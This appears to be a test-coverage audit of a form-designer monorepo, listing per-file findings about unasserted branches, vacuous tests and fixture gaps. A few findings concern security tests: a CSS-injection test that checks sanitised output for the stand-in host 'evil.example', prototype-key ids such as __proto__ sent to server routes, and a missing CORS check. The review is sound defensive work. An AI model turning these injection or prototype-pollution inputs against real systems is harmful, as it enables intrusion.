- **[MEDIUM]** **[E3]** `Designer.test.tsx:397` — the shell's "anything that takes focus itself keeps it" early return is never asserted; the one test that touches a chrome input does `await user.click(name)` then `fireEvent.keyDown(name, …)`, dispatching on the element regardless of `document.activeElement`, so the assertion holds whether or not the click left focus there. No other test in either suite asserts `activeElement` after clicking designer chrome. Delete the `target.closest(…)` early return and this file, `Tree.test.tsx` and `Canvas.test.tsx` all stay green.
- **[LOW]** **[E3]** `Designer.test.tsx:318` — the shell's own removal announcement (`Designer.tsx:635`) is never read; the two places this file presses Delete assert only the document, and the live-region assertions in `Tree.test.tsx` come from a different call site with the same text.
- **[NOTE]** **[E2]** `Designer.test.tsx:122` — the theme select's defensive narrowing has no test and cannot be reached through `user.selectOptions`. Recorded so it is not mistaken for covered.

## packages/designer/src/Icon.test.tsx

- **[LOW]** **[E2]** `Icon.test.tsx:87` — `it('is square, and both sides follow the size')` sits inside `describe('an icon the vocabulary does not have')` but renders `<Icon name="text" />`, so the file reports a passing test under a heading describing a case it does not exercise, and duplicates most of the test at `:66`.
- **[NOTE]** **[E3]** `Icon.test.tsx:36` — the sweeps iterate `ICON_NAMES`, which is `Object.keys(GLYPHS)`, so they can only visit names that already have a glyph. The file's own comment correctly identifies the `Record<IconName, ReactNode>` annotation as the real guarantee.

## packages/designer/src/dnd.test.ts

- **[MEDIUM]** **[E4]** `dnd.test.ts:643` — `inOneRow`'s nearest-group fallback is never exercised: every repeater case puts the pointer inside a child rectangle, so `containing` always answers and the distance loop never runs. Replace the whole loop with `return groups[0]` and every test stays green, while a drop released in the gap between two repeater rows silently resolves against row 0 — the defect the row grouping was added for.
- **[NOTE]** **[E4]** `dnd.ts:418` — the `anchor === -1` fallback is unreachable, not merely untested. Flagged so nobody writes a test that pretends to cover it.

## packages/designer/src/drag.test.ts

- **[MEDIUM]** **[E3]** `drag.test.ts:509` — `visibilitychange` is registered in `drag.ts:351` and fired by no test in `packages/` or `e2e/`; only `blur` is. Delete the add/remove pair and the suite stays green while a drag survives the tab being switched away with its label glued to the cursor — the case the handler's comment says it exists for.
- **[LOW]** **[E3]** `drag.test.ts:469` — the same gesture and assertion appear three times (`:309`, `:469`, `:677`). Three tests, one behaviour.
- **[NOTE]** **[E3]** `drag.ts:197` — the `Number.isFinite` fallback cannot be reached through a real event, since `MouseEventInit.clientX` is a WebIDL `long`. The test at `:244` covers the finite-zero side, which is the half that matters.

## packages/designer/src/geometry.test.ts

- **[LOW]** **[E3]** `geometry.test.ts:1` — `measureIn`'s border term and `originOf` have no test in any suite; jsdom cannot supply either, and `e2e/canvas.spec.ts:55-77` covers the scroll term only. A border on `.fs-canvas__surface` would offset every selection frame and every drop with nothing red.
- **[LOW]** **[E3]** `geometry.test.ts:83` — `measureTree` is only ever asserted by counting candidates per key; `index`, `depth`, `parentKey` and `container` are never read back, so swapping the `index` and `depth` arguments in the `visit` recursion leaves this file green.
- **[NOTE]** **[E2]** `geometry.test.ts:41` — `CSS.escape` on the key is untested; no fixture uses a key that needs escaping, and a host-supplied document is not gated.

## packages/designer/src/keyboard.test.ts

- **[HIGH]** **[E4]** **(Verified — the source defect is confirmed; see Area B.)** `keyboard.test.ts:204` — `describe('moveTarget when two parents share a key')` covers `up` and `down` only, and the `left` arm still has the exact defect the block was written about. Traced against this file's own `twoStacks()` fixture: `moveTarget(flatten(twoStacks()), 'c', 'left', isContainer)` answers `index: 1` where `c` lives in the second stack and the correct answer is `2`. Alt+Left on a node in the second of two namesake containers lands it in the wrong place and no test in either suite asks. No source change needed — the branch is already wrong and green.
- **[LOW]** **[E3]** `keyboard.test.ts:97` — `focusTarget` has no duplicate-key case, so the "answers the first" contract documented at `keyboard.ts:26-36` is pinned for `moveTarget` and not for the function the comment sits on.

## packages/designer/src/store.test.ts

- **[MEDIUM]** **[E4]** `store.test.ts:23` — the non-mutation assertion exists for `commit` and for neither `undo` nor `redo`, so half of what the test's own comment calls "invariant 4's caller-visible half" is unguarded. Rewrite `undo` to `past.pop()` and every test that calls it stays green, while the `History` object React still holds in state has had its array mutated underneath a component that already rendered from it.
- **[MEDIUM]** **[E3]** `store.test.ts:1` — what neither this file nor `store.regressions.test.ts` reaches, checked against every other suite first. Genuinely uncovered everywhere: `duplicateComponent`'s four refusals (`store.ts:614-633`) together with the announcements they drive at `Tree.tsx:232` and `:237`; `setLanguages`' empty-list guard; `containerFor` walking more than one level up and its `!parent → root.key` fallback; and `MAX_HISTORY` at the hook level. On the three specifics worth stating plainly: history bounds, coalescing and redo-clearing on a fresh edit *are* tested, and the document half of invariant 4 is covered in core rather than here, correctly.

## packages/designer/src/store.regressions.test.ts

- **[LOW]** **[E4]** `store.regressions.test.ts:481` — `it('never gives two duplicates the same key, however they are batched')` passes because the second duplication is *refused*, not because two distinct keys were generated, and the test cannot tell those apart: both calls sit in one `act` and read the same `latest.current`, so the second hits the identity guard and returns the history unchanged. `collect(...)` sees one copy and the set-size assertion holds trivially. The control at `:506` is the right control; the batched test's stated subject is not what it observes. Also unasserted: the refused call still runs `setSelectedKey(copy.key)` with a key that is not in the document.
- **[NOTE]** **[E2]** `store.regressions.test.ts:19` — the `field` fixture omits `icon` and `doc()` builds `FormDocument` literals by hand rather than through `createDocument`. The languages entry does carry a dialect, so the trap this repo cares about most is avoided.

## packages/designer/src/designer.css.test.ts

- **[HIGH]** **[E4]** **(Verified.)** `designer.css.test.ts:265` — the guard still names the form's scopes as two literal strings, so a wrapper between `.fs-shell` and the form is invisible to both checks, and `.fs-body` is exactly such a wrapper today. Read directly: `insideTheForm` is `parts.slice(0, -1).some((part) => /\.fs-(shell|canvas)/.test(part) && !CHROME_UNDER_CANVAS.has(part))`, and `if (!insideTheForm) return false`; `Designer.tsx:275` renders `<div className="fs-body">` containing `<main className="fs-canvas">`, and `designer.css:149` declares `.fs-body`. For `.fs-body input`, the ancestor compound does not match the scope regex, so `reachesIntoTheForm` returns `false`, and `escapesTheDesigner` also returns `false` because `.fs-` appears in the selector. Failure scenario: add `.fs-body input { padding: 5px 8px }` — the rule that broke MUI's notched outline, at a real ancestor of the form — and the whole guard stays green. The direction was inverted for scopes *under* `.fs-canvas` and not for scopes *between* `.fs-shell` and it, so a new wrapper named anything else is silently unguarded rather than loudly refused.
- **[MEDIUM]** **[E4]** `designer.css.test.ts:517` — the two sanctioned exceptions are pinned by property *name* only (`declarationsFor` returns `line.split(':')[0]`), so an exception can be inverted or made visual without the guard noticing. Change `scrollbar-color: auto` to `scrollbar-color: #f00 #000`, or `pointer-events: auto` to `pointer-events: none`: same property names, guard green, and both do the thing the rules' own comments say they exist to prevent.
- **[LOW]** **[E2]** `designer.css.test.ts:351` — the allowlist lookup is `s in ALLOWED_CANVAS_REACH` on a plain object literal, so it consults `Object.prototype` and any selector spelled `constructor`, `toString`, `valueOf`, `hasOwnProperty` or `__proto__` is exempted from the reach check. Not exploitable today; the exemption is wider than the object it reads.
- **[NOTE]** **[E3]** `designer.css.test.ts:39` — parser edges, reported honestly. Handled: `@media`/`@supports`, `:is()`/`:where()` in all four readers, comments including inside preludes. Not handled: `{`/`}` inside a string or `url()` treated as structural; `declarationsFor` splitting the body on `;` regardless of parens or quotes, so a `url(data:…;base64,…)` value mis-parses; `compounds()` splitting without honouring CSS escapes; and `@keyframes` selectors read as rules, which fails in the safe direction with a misleading message.

## packages/designer/src/panels/Canvas.test.tsx

- **[HIGH]** **[E4]** `Canvas.test.tsx:216` — `onKeyDownCapture` (`Canvas.tsx:409-436`) has no coverage in any suite, and the one test that looks like it does proves something else: `it('does not let a design-mode click reach the kit component')` clicks the input and types, but `onMouseDownCapture` has already cancelled the default, so focus never enters the input and `document.activeElement` is the shell — an *ancestor* of the surface — so the keydown never reaches the surface's capture handler at all. The empty `input.value` is explained entirely by focus never arriving. `e2e/canvas.spec.ts:79` has the same limitation and `e2e/keyboard.spec.ts:265` presses Tab without typing. Delete `onKeyDownCapture` from the props spread and both suites stay green, restoring the defect the handler's comment describes: tabbing into the canvas and typing reaches the kit's `onChange`, seeding preview data with answers nobody entered. The `shellShortcut` allowlist and the `navigational` exemptions are untested too, which matters because the comment records that the previous, broader version let Ctrl+V/A/X through.
- **[MEDIUM]** **[E3]** `Canvas.test.tsx:306` — the canvas's primary-button guard (`Canvas.tsx:389`) is untested while the identical guard in the tree has a dedicated pair of tests. Delete it and every suite stays green while a right-press plus four pixels relocates a component under its own context menu — the incident the comment records.
- **[MEDIUM]** **[E3]** `Canvas.test.tsx:441` — the drop indicator is asserted in no suite: a repo-wide grep for `fs-drop` matches only `Canvas.tsx:686` and `designer.css`. `dnd.test.ts` pins the indicator rectangle arithmetic thoroughly, but nothing checks that it reaches the element's inline style, nor that `empty` picks `fs-drop--empty` over `fs-drop--bar`. jsdom cannot, which puts this in `e2e/`, where it is also absent. Swap `top` and `left` in the style object and both suites stay green.
- **[LOW]** **[E3]** `Canvas.test.tsx:600` — the auto-validate-while-typing branch of the `errors` memo is not reached: the only error assertion clicks Validate first, which returns early before that code runs. The comment there records a real defect (comparing an address against a node key, so no field inside a repeater ever validated while typing) and nothing re-runs it.
- **[NOTE]** **[E3]** `Canvas.test.tsx:38` — `fieldRenders` is module-level mutable state shared across every test in the file. Currently safe because the three readers all go through `setup()`; one test away from not being.

## packages/designer/src/panels/Tree.test.tsx

- **[MEDIUM]** **[E4]** `Tree.test.tsx:802` — `it('still deletes from a tree row, where it can only mean one thing')` is presented as the control for the shell's Backspace narrowing but exercises a different handler entirely: the shell's listener is native and attached to `.fs-shell`, a descendant of React's root container, so it runs before the delegated synthetic handler — and at that moment `selectedKey` is `undefined`, because `row.focus()` selects nothing. The removal actually comes from the row's own handler. Delete the tree-row exemption from `backspaceIsSafe` and this test, and every other Backspace test, stays green; a repo-wide grep finds no other Backspace test in `packages/` or `e2e/`.
- **[MEDIUM]** **[E3]** `Tree.test.tsx:681` — the source-scanning guard matches `/data-fs-row=\{/` only, so it sees a JSX expression attribute and nothing else. A string-literal `data-fs-row="addresses[0]"`, or the attribute arriving through a spread, passes the guard while re-introducing the two-authors-of-one-attribute collision the whole describe is about.
- **[MEDIUM]** **[E3]** `Tree.test.tsx:244` — Ctrl+D's two refusal announcements are untested everywhere; `e2e/keyboard.spec.ts:152` covers the success path alone. Both are the only feedback a keyboard user gets that the gesture was refused rather than ignored, and both sit on top of `store.ts`'s four untested `return undefined` guards.
- **[LOW]** **[E3]** `Tree.test.tsx:169` — the tree's drop-indicator classes are asserted nowhere in either suite; `dnd.test.ts:458` pins `resolveTreeDrop`'s `mode` but nothing checks it reaches a class on the right row.
- **[LOW]** **[E3]** `Tree.test.tsx:214` — `aria-expanded` on tree rows is never asserted, though `keyboard.ts:38-53` states that Right stepping into the first child depends on every node being expanded and names this attribute as "the other half of this promise".
- **[LOW]** **[E3]** `Tree.test.tsx:169` — the row Remove button is untested as a control: no test clicks it, so neither its `onPointerDown` `stopPropagation` nor its `tabIndex={-1}` is pinned.

## packages/designer/src/panels/Properties.test.tsx

- **[HIGH]** **[E4]** **(Verified. Converged: two slices. Source defect in Area B.)** `Properties.test.tsx:127` — no test in this file or in `e2e/` ever re-renders the panel with a *different* selected node, and `KeyField` is the one editor that survives that transition with the previous node's state. The harness has `selectKey` but every test calls it exactly once, as the first selection. The test at `:235` ("is gone rather than stale after the rename is undone") pins the unmount-on-undo half of exactly this reasoning and leaves the selection half unasserted.
- **[HIGH]** **[E4]** `Properties.test.tsx:62` — the fixture kit declares a `number`-editor prop with the comment "so what this panel stores for one can be checked", and nothing in the file ever touches it; no e2e spec drives a number prop either. Delete the whole `Number.isFinite` arm at `Properties.tsx:684-687` and the suite stays green while `Infinity` and `NaN` land in `node.props`, which `JSON.stringify` writes as `null`, so the export and the submitted payload disagree with what the author typed. The comment names that as a fixed defect; nothing holds the fix in place.
- **[HIGH]** **[E4]** `Properties.test.tsx:36` — the fixture kit declares no `editor: 'json'` property, so `JsonEditor` is untested by this file and by the repository (a grep for `editor: 'json'` matches only the two kits' definitions, and no test or spec renders those rows). Delete the re-sync block at `Properties.tsx:788-792` and the suite stays green, restoring the exact defect its docblock records — "undo, an applied JSON import, and switching between two components of the same type all left stale text on screen that a blur would then write back". The clear-on-empty branch, the parse-failure alert and the `aria-describedby` wiring are unasserted for the same reason.
- **[MEDIUM]** **[E3]** `Properties.test.tsx:483` — the Reset button is never clicked anywhere in the repo, though `ClearButton` is rendered on four paths and `onChange(undefined)` is the only gesture that removes a property so the component default applies again.
- **[MEDIUM]** **[E2]** `Properties.test.tsx:608` — "the multiline editor" asserts only that the element is a `TEXTAREA`; the write path is never driven, so the editor could be inert and the test name would still be satisfied.
- **[MEDIUM]** **[E2]** `Properties.tsx:111` — the "Type X is not in the active kit" branch is untested, as is the no-selection empty state at `Properties.tsx:31`; every test selects a node first.
- **[NOTE]** **[E2]** `Properties.test.tsx:1544` — `stored(['007', ' x '])` is the value-normalisation round trip for the options box, and the equivalent for `Rules.tsx`'s `NumberField` does not exist. Noted because the pattern is right here and was not copied one panel over.

## packages/designer/src/panels/Binding.test.tsx

- **[HIGH]** **[E4]** `Binding.test.tsx:616` — "carries the text with it" is the only test that exercises the translation-key *rename*, and its fixture is dialect-free (`{ code: 'en' }`, `{ code: 'fr' }`), so `languageTag(language)` and `language.code` are the same string throughout the path under test. Replace `languageTag(language)` with `language.code` at `Binding.tsx:260` and every assertion stays green. The file *knows* this trap — two other blocks switch to `en-US` specifically to make the tag/code distinction visible, and a comment says every dialect-free fixture is the unrealistic one — but the rename path was left on the old fixture. Failure scenario: a real document (`createDocument` ships `en-US`) renames a key, the carry reads bundle `en`, finds nothing, and the text under the old key is orphaned — the defect the docblock says this shape exists to prevent.
- **[MEDIUM]** **[E3]** `Binding.test.tsx:608` — four branches of `TranslationKeyField` are never driven: the empty/unchanged revert, Enter-to-commit, Escape-to-revert, and the re-sync at `Binding.tsx:246-249`. Deleting the re-sync leaves the suite green and re-creates the stale-draft class that two sibling panels each have a whole describe for.
- **[MEDIUM]** **[E3]** `Binding.test.tsx:57` — `makeDocument` always writes `translations: {}`, so `bundleFor`'s two guards are never handed the shapes they exist for. Delete both and nothing is red, while a host-restored document missing `translations` — which `store.ts` only warns about — crashes the panel somebody opened to repair it.
- **[LOW]** **[E2]** `Binding.test.tsx:99` — `BindingMode`'s `if (kind === current) return` guard is untested; removing it would fire a spurious `onChange` that replaces the binding with a fresh empty one of the same kind, discarding an authored expression, with the suite green.

## packages/designer/src/panels/Rules.test.tsx

- **[HIGH]** **[E4]** `Rules.test.tsx:564` — the `malformed` table covers only non-array `validations`, so it blesses `Array.isArray(schema.validations)` as a sufficient guard when it is not: an array whose entries are junk passes that check and crashes one line later at `Rules.tsx:134`, `new Set(rules.map((r) => r.key))`, on `validations: [null]`. `validateDocument` does reject that entry, so the JSON dialog is gated — but `store.ts:333-341` only warns for a host-supplied `initialDocument`, which is precisely the path the docblock says is ungated. A host restoring `{"schema":{"type":"string","validations":[null]}}` takes the designer down on opening the Rules tab, and this describe — which exists to prove that cannot happen — stays green.
- **[MEDIUM]** **[E4]** `Rules.test.tsx:304` — `NumberField`'s normalisation-display fix is unpinned: `Rules.tsx:290-291` exists because "typing `007` left the box reading `007` over a document holding `7`", and every numeric fixture commits a value whose spelling already equals its normalised form. Delete `setDraft(String(next))` and the whole file stays green while the panel again shows a value the document does not hold. The `'007'` round-trip fixture exists one file over.
- **[MEDIUM]** **[E3]** `Rules.test.tsx:604` — `NumberField`'s Enter-commit and Escape-revert are never exercised; every commit in this file is `user.tab()`, and `e2e/authoring.spec.ts:69` uses `.fill()` without pressing Enter, so both branches are untested in both suites.
- **[MEDIUM]** **[E3]** `Rules.test.tsx:545` — a rule key the panel's own table does not know is never fixtured, so three fallbacks are untested, including the hint fallback whose comment records that it used to render `undefined`.
- **[LOW]** **[E2]** `Rules.test.tsx:95` — the no-selection message is never asserted, and `makeRule` is only ever driven for four of the seven rule kinds, so the `maxLength`/`min`/`max` arm of the switch is untested.
- **[NOTE]** **[E2]** `Rules.test.tsx:356` — `getByLabelText(/regular expression|Value/i)` is a deliberately loose alternation that stops naming the control it means the moment a second rule is on screen.

## packages/designer/src/panels/StyleTab.test.tsx

- **[HIGH]** **[E4]** `StyleTab.test.tsx:210` — every refusal test types into the raw CSS box; nothing ever types a brace into a *structured* control, so `StyleTab.tsx:143-145` is untested here and in `e2e/style.spec.ts`, which also only fills the raw box. Delete the `safeDeclarations` check and both suites stay green while the defect its own comment records returns: "a brace typed into the Radius field was stored, the renderer then dropped the whole block, and the component lost every other declaration on that layer with nothing on screen explaining why". The file has a Radius test and three brace tests; the one combination that matters is the one that is missing.
- **[MEDIUM]** **[E3]** `StyleTab.test.tsx:135` — every `css` fixture in the file is a string, so `StyleTab.tsx:83-84`'s `typeof` guard is never entered, though its comment says an entry that is a number or an object "throws out of the render of the panel somebody opened to repair it" — a host-supplied-document path the JSON dialog does not gate.
- **[MEDIUM]** **[E3]** `StyleTab.test.tsx:322` — `DeclarationField`'s Enter-commit and Escape-revert are never driven, and the no-op guard `if (draft === committed) return` is unasserted, even though the sibling panel has a whole describe making exactly that point ("moving focus through a control is not editing it") for the same coalescing label.
- **[LOW]** **[E2]** `StyleTab.test.tsx:135` — the no-selection message is untested and the `device === 'any'` versus device-specific hint is never read, so the two strings could be swapped with nothing red.
- **[NOTE]** **[E2]** `StyleTab.test.tsx:388` — `inRow()` gives the repeater the same string for its node key and its data key, one name short of the fixture shape the repo's own trap list asks for.

## packages/designer/src/panels/DocumentDialog.test.tsx

- **[HIGH]** **[E4]** `DocumentDialog.test.tsx:510` — "copies the draft and says it did" cannot tell the draft from the stored document: the test opens the dialog and reads `editor().value` without editing, and `draft` is initialised to `documentJson`, so at that moment the two are identical byte for byte. Revert `copy(draft, …)` to `copy(documentJson, …)` and this test stays green — restoring the regression the comment records ("after editing the textarea both handed over the version from before the edit — silently, with the edit still on screen"). Nothing else in the repo covers it; all three clipboard tests run on an unedited draft.
- **[MEDIUM]** **[E3]** `DocumentDialog.test.tsx:143` — `download` is never invoked anywhere in `packages/` or `e2e/`, so the attach-before-click / revoke-on-a-later-task sequencing the comment exists for is unpinned, both Download buttons are unclicked, and `slugify` — including its `slug || 'form'` fallback — has no test at all.
- **[MEDIUM]** **[E3]** `DocumentDialog.test.tsx:427` — the JSON Schema view is asserted only on a fixture whose single rule is fully exportable, so `unexportableRules` is always empty and the lossy note never renders. Delete that whole clause and the suite stays green, and the schema view then claims a faithful projection of a form whose rules it silently cannot express. The schema-view Copy button is never clicked either.
- **[MEDIUM]** **[E3]** `DocumentDialog.test.tsx:192` — `documentProblems` is exercised with four shapes and not with the one that makes the `as FormDocument` cast honest: a `root` that is an object whose `key`/`type` are not strings.
- **[NOTE]** **[E5]** `DocumentDialog.test.tsx:80-99` — the `beforeAll` polyfill is dead code: it uses `??=`, and the repo pins `jsdom@^30.0.1`, which implements `showModal` and `close` natively, so neither assignment ever runs. The comment "jsdom implements neither of these" is stale, and the related comment at `:618-620` should be re-derived against jsdom 30 before it is relied on again.

---

# Area G — the kit conformance suite and the shared test rig

## packages/renderer/src/renderer.test.tsx

- **[HIGH]** **[E4]** `renderer.test.tsx:396` — no test in this file, or anywhere in the repo, renders a repeater inside a repeater, so the renderer's only nested-row line is unfailable. `index.tsx:583` passes `path={row?.path ?? NO_ROWS}` into `<Row>`; every repeater fixture here is single-level, so `row` is always `undefined` at that call and `row?.path` never contributes. `rows.test.ts` covers nested `pushRow`/`addressOf`/`applyChange` arithmetic but is a Node suite with no React, and `e2e/repeater.spec.ts` drops exactly one `Repeater`. Change `path={row?.path ?? NO_ROWS}` to `path={NO_ROWS}` and the whole suite stays green, while an inner-row field emits `data-fs-row="contacts[0]"` and calls `onChange('contacts[0].x', …)` instead of the full path, so `applyChange` writes every inner keystroke into a top-level list or nowhere.
- **[MEDIUM]** **[E4]** `renderer.test.tsx:1381` — the `kit.fallback` branch is never exercised; only the third fallback is. `index.tsx:513` is `kit.renderers[node.type] ?? kit.fallback ?? MissingType`, and no `RendererKit` literal carrying `fallback` exists in any test or kit source. Delete `?? kit.fallback` and the suite is green while a host that supplied its own fallback renderer silently gets the built-in dashed box.
- **[MEDIUM]** **[E3]** `renderer.test.tsx:146` — the `device` prop has no test anywhere in the repo (`grep -rn "device="` over all test files returns nothing). `css.test.ts:118` covers `styleSheetFor`'s device argument in isolation, but nothing covers the renderer passing it. Drop `device` from the options object at `index.tsx:797` and the suite is green while the designer's canvas emits media queries that answer about the browser window rather than the simulated frame — the failure the prop's own docblock describes.
- **[LOW]** **[E4]** `renderer.test.tsx:1551` — `it('does not take the form down')` asserts `expect(() => render(...)).not.toThrow()`, which the node boundary guarantees by existing, so the assertion carries no weight. Harmless because its sibling at `:1565` does the real work. This is the same unfailable shape `test/kit-contract.test.tsx:1245-1255` documents and removed from itself.
- **[LOW]** **[E3]** `renderer.test.tsx:424` — the repeater block covers grow and shrink but never a reorder, and the `revealHidden` fixtures are never re-rendered with the hidden field holding data, so "a hidden field keeps its answer when the condition flips back" is asserted nowhere.
- **[NOTE]** **[E2]** `renderer.test.tsx:1610` — `asDocument` opens with `documentOf([]) && { ... }`, a dead expression evaluated and discarded on every call.

## packages/kit-mui/src/renderers.test.tsx

- **[MEDIUM]** **[E4]** `kit-mui/src/renderers.test.tsx:88` — the file's stated rule ("a length the document authored is not the host theme's to rescale") is tested only on `Box.padding` and `Box.radius`, and one length in the same kit still routes through `theme.spacing`: `renderers.tsx:601` is `gap={1}` on `ButtonGroupNode`'s `Stack`, a bare number, unlike every other length in the file. `ButtonGroup` is absent from this file's fixtures and from `LENGTHS` in the contract suite. No change needed: under the themed fixture already constructed at `:95` the button gap is 3px and under the default 8px, and no assertion looks at it.
- **[LOW]** **[E2]** `kit-mui/src/renderers.test.tsx:83` — the class filter matches by substring, so `.css-abc` also selects a rule for `.css-abcd`. Emotion's hashes are fixed-width so a collision is unlikely today, but the same helper is copy-pasted into `test/kit-contract.test.tsx:319`.
- **[NOTE]** **[E2]** `kit-mui/src/renderers.test.tsx:89` — the default-theme case asserts only `border-radius` while its `.each` sibling asserts both `border-radius` and `padding`, and the default-theme case is the one the docblock calls "the defect".

## test/kit-contract.test.tsx

- **[HIGH]** **[E3]** **(Verified.)** `test/kit-contract.test.tsx:18` — the contract never checks that a data-bound control *reports* a change. Counted directly: the file imports `fireEvent` once and uses it once, at `:1458`, for a `RadioItem` click; there is no `fireEvent.change` or `userEvent.type` anywhere in it, and `onChange={() => undefined}` appears 18 times. Replace every `onChange={(e) => onChange(e.target.value)}` in `kit-html/src/renderers.tsx` with a no-op and a kit that draws every control, marks it required and invalid, wires `aria-describedby`, announces its errors, and collects no answers at all passes 100% of this suite bar one radio rule. "A kit is a package, not a rewrite" rests on the kit reporting answers, and that half is unrun. This is the single largest hole in the repository's test architecture.
- **[HIGH]** **[E5]** **(Verified. Converged: three slices.)** `test/kit-contract.test.tsx:1483` — the conformance suite is structured so it can never see a kit's own `defaultProps`, and the MUI kit is currently non-conforming to the spec sentence the `LENGTHS` block exists to enforce (the 2px-vs-16px gap divergence in Area C). Three rules could have caught it and each is built so it cannot: `%s is described identically by both` (`:241-256`) deliberately excludes `defaultProps`; the `LENGTHS` rows always pass an explicit value via `drawWith(type, { [name]: value })`; and `a default copied between kits` (`:1483`) compares `Step.gap` to `Stack.gap` *within* one kit, so 2/2 and 16/16 both pass. Its comment ("MUI's `gap` is a spacing-scale multiplier and the HTML kit's is pixels") is itself stale relative to the renderer.
- **[HIGH]** **[E5]** **(Verified.)** `test/kit-contract.test.tsx:639` — `expect(a.outerHTML).not.toBe(b.outerHTML)` in `'$name still tells its own variants apart'` cannot fail. `a` and `b` come from two separate `draw()` calls, each mounting a fresh `FormRenderer`, and `scope` is `useId()` (`renderer/src/index.tsx:781`) which every renderer spreads onto the element as `data-fs-scope`; React's client `useId` is a module-global counter that is not reset per root, so the two strings differ on that attribute alone, on every run. Collapse every declared variant to the default in either kit and this test stays green — and with it the rule it is the control for (`does not let a Text variant add classes of its own`) becomes meaningless, exactly as the comment at `:625-629` warns.
- **[MEDIUM]** **[E5]** `test/kit-contract.test.tsx:1045` — the `LENGTHS` table contains a row that runs against zero kits and passes silently: `{ type: 'Container', name: 'gap', … }`, and neither kit ships a `Container`. It hits `if (!has(length.type, length.name)) return` for both kits and reports green. The same `return` means renaming `Stack.gap` in both kits turns the obligation off rather than failing it — the "quiet exit" the `DRIVEN` docblock says this file was restructured to eliminate. `DRIVEN` only asserts the *type* exists, never that it still declares the prop the rule drives.
- **[MEDIUM]** **[E3]** `test/kit-contract.test.tsx:1043` — `LENGTHS` is hand-written rather than derived from the kits' definitions, so a length-valued prop escapes by not being listed. `Screen.maxWidth` is declared by both kits, is a length, and the two kits render it differently for values at or below 1 — MUI's sizing transform reads `1` as `100%` while kit-html renders `1px`. `kit-mui/src/renderers.tsx:549-557` documents this exact reinterpretation for `Image.width` and fixes it with `px()`; `Screen.maxWidth` was not fixed and is not in `LENGTHS`.
- **[NOTE]** **[E3]** `test/kit-contract.test.tsx:1245` — `renders a data-bound component without crashing on an absent value` proves the kit drew something but never that the control is *controlled*. Replacing `jsonToString(value)` with `value as string` in either kit leaves the rule green (React only warns to `console.error`, and nothing in the suite fails on that) while a field flips from uncontrolled to controlled on first keystroke.
- **[NOTE]** — checked and sound: an empty `definitions` map would **not** pass this suite. Four rules each assert a non-empty floor.

## test/kit-css-injection.test.tsx

- **[MEDIUM]** **[E4]** `test/kit-css-injection.test.tsx:189` — the two HTML-kit refusal assertions pass vacuously on an empty read, and the floor their MUI siblings were given three lines above was not added here. `serverStyleAttribute` returns `''` when its regex finds no match, and `expect('').not.toContain('evil.example')` passes. The MUI sibling at `:167` explicitly added a length and content check with the comment "Without it, 'sanitised' and 'nothing was emitted' are the same green"; the identical hole is left open on the HTML half. The same helper also searches the rest of the markup from the `data-fs-key="target"` offset, so it can return a later element's `style` attribute.
- **[MEDIUM]** **[E3]** `test/kit-css-injection.test.tsx:5-24` — the file's premise ("`background` on `Box` is the only string-typed style value either kit has") is a hand-maintained claim nothing executes, and the fixture is hardcoded to that one prop; nothing enumerates `kit.components` for props that reach a `style`/`sx` sink, the way the contract suite derives its `nodeProps` rules. Add `background` to `Card` in either kit without `safeStyleValue` and this file is green while a document authors a top-level rule against the host's whole page.
- **[NOTE]** **[E3]** `test/kit-css-injection.test.tsx:151` — thin as a *grammar* test (two payloads), which is defensible: `css.test.ts:383-439` covers the grammar exhaustively, including the `\75 rl(` escape. What this file adds is sink coverage, and the asymmetry there is the real gap — MUI is checked only on the client emotion path and kit-html only on the server path, even though the file's own argument for testing server-side points at MUI first.

## test/fixtures.ts

No issues found. Both exports have real consumers, the shared-string rationale is sound, and there is no secret or PII in it.

## test/setup.ts

- **[MEDIUM]** **[E5]** **(Verified.)** `test/setup.ts:25` — `observerCount()` has no consumers anywhere in the repository. A repo-wide grep returns exactly three hits, all inside `test/setup.ts` itself: the export at `:25` and two mentions in its own comments. The docblock asserts "A test asserting a leak reads this" and the block at `:3-13` argues at length that a counter reading zero "is precisely the silent pass the counting was added to prevent" — while no test asks the counter anything at all. An obligation written down, with nothing that executes it.
- **[MEDIUM]** **[E3]** `test/setup.ts:59-67` — even if a leak test were written, the counter could not come back down: `disconnect()` increments `disconnects` and does not decrement `observing`, and the only `ResizeObserver` consumer in the repo cleans up with `disconnect()` and never `unobserve()`. So `observing` increases monotonically for the life of a test file, and the distinction the docblock says it exists to draw is the one this stub cannot draw. There is also no `beforeEach` reset, so any absolute-count assertion would be order-dependent.
- **[MEDIUM]** **[E3]** `test/setup.ts:1` — a global setup file is where a `console.error` gate belongs, and there is none, so every React warning is silent across every jsdom suite in the repo: the controlled→uncontrolled warning, the duplicate-`key` warning and `act()` warnings are all invisible. `renderer.test.tsx:1037` goes further and mocks `console.error` to a no-op for eight renders. Combined with the contract-suite note above, a kit that flips an input from uncontrolled to controlled passes conformance in silence.
- **[NOTE]** **[E3]** `test/setup.ts:20-22` — the `globalThis` stash is justified by reasoning that does not describe this configuration (with `forks` + `isolate: true`, each test file gets its own process and its own `globalThis`). Harmless, until someone sets `isolate: false`.

## apps/demo-server/src/index.test.ts

- **[HIGH]** **[E4]** `apps/demo-server/src/index.test.ts:374` — the describe is named "a form id borrowed from `Object.prototype`" and drives only the submit route, leaving the null-prototype fix on the two routes that *write* the store untested. All four ids go to `/submit`, which is POST-only; there is no `PUT` or `DELETE` on `__proto__` anywhere in the file, and no other test file touches the demo server. `index.ts:370` and `:392` build `Object.assign(Object.create(null) as Store, store)` precisely for this, with a comment naming the defect: "`store['__proto__'] = doc` answered `{ok: true}` and stored nothing at all". Change both to `{ ...store }` and the suite stays green while `PUT /api/forms/__proto__` answers 200, stores nothing, and the listing reports a write that never joined.
- **[MEDIUM]** **[E4]** `apps/demo-server/src/index.test.ts:74` — no test sends a malformed or wrongly-shaped body; every call passes syntactically valid JSON, so `bodyOf`'s `try/catch` and the submit route's shape guard are both unreached. The docblock says the defect being fixed was "malformed JSON was a 500 rather than a 400". Delete the `try/catch` and the suite is green while a non-JSON body 500s with a stack trace.
- **[MEDIUM]** **[E4]** `apps/demo-server/src/index.test.ts:1` — the CORS allowlist has no test: no request carries an `Origin` header and nothing reads `access-control-allow-origin`. Replace the allowlist with a bare `cors()` and the suite is green, and every route is reachable cross-origin with `PUT` and `DELETE` on a server with no authentication — which is what the config's own comment says it exists to prevent.
- **[MEDIUM]** **[E3]** `apps/demo-server/src/index.test.ts:33-34` — the two guards the submit route describes as its defence against silent, permissive failure are never executed, and the fixture comment says so out loud ("No `computed` binding anywhere, or the route refuses the document"). Delete either check and the suite is green while a document whose visibility rule is `computed` has its whole subtree treated as hidden and skipped, so a submit succeeds with required answers missing.
